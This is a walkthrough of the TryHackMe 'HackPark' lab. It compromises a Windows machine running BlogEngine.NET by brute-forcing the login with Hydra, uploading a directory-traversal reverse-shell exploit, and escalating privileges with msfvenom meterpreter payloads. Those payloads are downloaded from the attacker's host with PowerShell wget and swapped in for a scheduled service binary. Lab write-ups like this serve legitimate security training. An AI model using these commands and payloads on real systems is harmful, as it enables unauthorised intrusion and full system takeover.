# HackPark

Bruteforce a websites login with Hydra, identify and use a public exploit then escalate your privileges on this Windows machine! https://tryhackme.com/room/hackpark

## Deploy the vulnerable Windows Machine:

As first step we try to run an Nmap scan to see services running and ports open

    nmap -sV <ip>
    Starting Nmap 7.60 ( https://nmap.org ) at 2023-11-09 17:06 GMT
    Nmap scan report for ip-10-10-177-224.eu-west-1.compute.internal (10.10.177.224)
    Host is up (0.00027s latency).
    Not shown: 999 filtered ports
    PORT   STATE SERVICE VERSION
    80/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
    MAC Address: 02:3D:09:CA:E4:C3 (Unknown)
    Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
    
    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 35.03 seconds

There is just a web server running on port 80. Save the image in the home page and use Google Search Images to find out the Clown's name (if you don't already know).

## Using Hydra to brute-force a login

In the menu you'll find a Login link from the main web page. If you inspect the source you'll notice is a simple form with a POST method. 

Open the Inspect Console in Firefox and try to login with random values. You'll notice in the Network panel a POST entry, copy that entry as fetch in Console.

Now it's time to create the Hydra command. You can try to provide multiple usernames and passwords to Hydra, but the hint suggests to use admin as username. For the passwords you can either use the available ones from Kali Linux or the Try Hack Me AttackBox or the ones from https://github.com/danielmiessler/SecLists

With hydra the command will look like:

    hydra -l admin -P /usr/share/wordlists/rockyou.txt <ip> http-post-form "/Account/login.aspx:<body_from_the_console>:Login Failed"

Once the command completed you should have a password for the admin account.

## Compromise the Machine

Login to the administrative panel of Blog Engine, in the  ABOUT section you'll find the version of BlogEngine.

If you search in Expoloit Database you'll find the CVE number for the exact same version.

The HackPark machine request to find a way to get a reverse shell, so it will be easy to find the information and the CVE number.

    searchsploit blogengine
    ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
     Exploit Title                                                                                                                                                                                       |  Path
    ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
    BlogEngine 3.3 - 'syndication.axd' XML External Entity Injection                                                                                                                                     | xml/webapps/48422.txt
    BlogEngine 3.3 - XML External Entity Injection                                                                                                                                                       | windows/webapps/46106.txt
    BlogEngine 3.3.8 - 'Content' Stored XSS                                                                                                                                                              | aspx/webapps/48999.txt
    BlogEngine.NET 1.4 - 'search.aspx' Cross-Site Scripting                                                                                                                                              | asp/webapps/32874.txt
    BlogEngine.NET 1.6 - Directory Traversal / Information Disclosure                                                                                                                                    | asp/webapps/35168.txt
    BlogEngine.NET 3.3.6 - Directory Traversal / Remote Code Execution                                                                                                                                   | aspx/webapps/46353.cs
    BlogEngine.NET 3.3.6/3.3.7 - 'dirPath' Directory Traversal / Remote Code Execution                                                                                                                   | aspx/webapps/47010.py
    BlogEngine.NET 3.3.6/3.3.7 - 'path' Directory Traversal                                                                                                                                              | aspx/webapps/47035.py
    BlogEngine.NET 3.3.6/3.3.7 - 'theme Cookie' Directory Traversal / Remote Code Execution                                                                                                              | aspx/webapps/47011.py
    BlogEngine.NET 3.3.6/3.3.7 - XML External Entity Injection                                                                                                                                           | aspx/webapps/47014.py
    ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------

Look at the exploit code. Let's first run netcat on your machine on a particular port (I choose 4444)

    nc -lvnp 4444

  
now create a file named PostView.ascx and copy the exploit code in this file.

Substitute in the 

    System.Net.Sockets.TcpClient

method your host ip and the port choosen in the netcat command.

In the BlogEngine WebApp edit the only post available and upload the file just created.

Now invoke the following path in the browser

    http://<ip>/?theme=../../App_Data/files

In the netcat terminal you'll get the reverse shell.

Just do a whoami to understand the user.

## Windows Privilege Escalation

As suggested "You can generate the reverse-shell payload using msfvenom, upload it using your current netcat session and execute it manually!"

So let's create the reverse shell with msfvenom

    msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -e x86/shikata_ga_nai -f exe -o reverse.exe

The ip will be the one of your machine and the port is one of your choice. Now we need to upload this file on the target machine. Let's spin up a python server:

    python -m http.server

On the original shell we had we can run the following command now:

    powershell -c wget "http://<ip>:8000/reverse.exe" -outfile "reverse.exe"

You'll need to be on a writable directory so move to C:\\Windows\Temp

We are almost ready but first let's spin up Metasploit on a different terminal

    msfconsole

Once started we need to obtain a reverse shell in meterpreter

    msf6 exploit(multi/handler) > use exploit/multi/handler
    [*] Using configured payload windows/meterpreter/reverse_tcp
    msf6 exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse_tcp
    PAYLOAD => windows/meterpreter/reverse_tcp
    msf6 exploit(multi/handler) > set LHOST 10.10.143.146
    LHOST => 10.10.143.146
    msf6 exploit(multi/handler) > set LPORT 4445
    LPORT => 4445
    msf6 exploit(multi/handler) > run

You'll have a meterpreter shell now.

With sysinfo command you'll be able to get the Windows Information.

Now we need to do more enumeration.

Download a winPEAS x86 exe and run the following command in the meterpreter

    upload winPEASx86.exe

Be sure to be in a writable directory.

Pass to shell

    shell
    .\winPEASx86.exe servicesinfo

You'll see the abnormal service is WindowsScheduler.

It is suggested to look at logs for the service so we can check in c:\Program Files (x86)\SystemScheduler\Events>

There is a log file and you'll notice there are references to Message.exe. That's the binary you're supposed to use to escalate privilege.

We could simply use a reverse shell again

    msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -e x86/shikata_ga_nai -f exe -o Message.exe

Open another msfconsole and do

    msf6 exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse_tcp
    PAYLOAD => windows/meterpreter/reverse_tcp
    msf6 exploit(multi/handler) > set LHOST <ip>
    LHOST => 10.10.143.146
    msf6 exploit(multi/handler) > set LPORT <port>
    LPORT => 4446
    msf6 exploit(multi/handler) > run

In the other meterpreter upload the Reverse Shell binary Message.exe in C:\Program Files (x86)\SystemScheduler

After a while you'll get another meterpreter shell in the second msfconsole with root permissions.

Just find the flag for the user Jeff and Administrator. They are both on Desktop.

## Privilege Escalation Without Metasploit

The process is the same but this time we need to generate a windows/shell_reverse_tcp and upload it.

    msfvenom -p windows/shell_reverse_tcp LHOST=<ip> LPORT=<port> -e x86/shikata_ga_nai -f exe -o reverse_tcp.exe

This will be server by the Python server running before. In the original reverse shell (the first) run

    powershell -c wget "http://<ip>:8000/reverse_tcp.exe" -outfile "reverse_tcp.exe"

On a different terminal run

    nc -lvnp <port>

and where you downloaded the file:

    reverse_tcp.exe

You'll have a shell and you can do exactly the same process with winPEAS uploaded in the same way.

To get the System time of installation do:

    systeminfo | findstr /i date

